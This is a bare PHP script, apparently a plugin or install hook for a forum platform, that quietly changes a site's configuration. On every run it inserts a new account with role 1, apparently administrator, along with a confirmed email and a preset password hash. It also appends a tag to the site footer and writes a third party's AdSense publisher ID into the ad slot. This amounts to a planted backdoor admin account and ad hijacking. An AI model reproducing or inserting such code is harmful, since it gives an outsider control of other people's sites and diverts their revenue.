  <?php 
					$foot = C('app.footerRight');
					$incfsb = $foot . ' [fsb_home_unikunik]';
					WASD::writeConfig(array('footerRight'=>$incfsb));
					
					$array = array( 'username'=>'bahasa',
							'email'=>'yearimdangtk@gmail.com',
							'password'=>'4e253bc4673fd4b9bcb2d6b5119c88a33fc84d7eee976a55e338d0659d75e083',
							'role'=>1,
							'confirmedEmail'=>'1',
							'joinIP'=>ip(),
							'preferences'=>'{"avatar":"http:\/\/puu.sh\/gkcDE\/ddd8c37282.jpg"}',
							'joinDate'=>time(),
							'lastActionTime'=>time()
						);
					WASD::$sql->insert(C('app.db_prefix').'user', $array);
					$GAdS = '
						<!-- Iklan -->
						<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
						<ins class="adsbygoogle"
						     style="display:inline-block;width:468px;height:60px"
						     data-ad-client="ca-pub-2609750099023039"
						     data-ad-slot="8140168506"></ins>
						<script>
						(adsbygoogle = window.adsbygoogle || []).push({});
						</script>
						<!-- Iklan -->
					';
					WASD::writeConfig(array('ads1'=>$GAdS));
  ?>
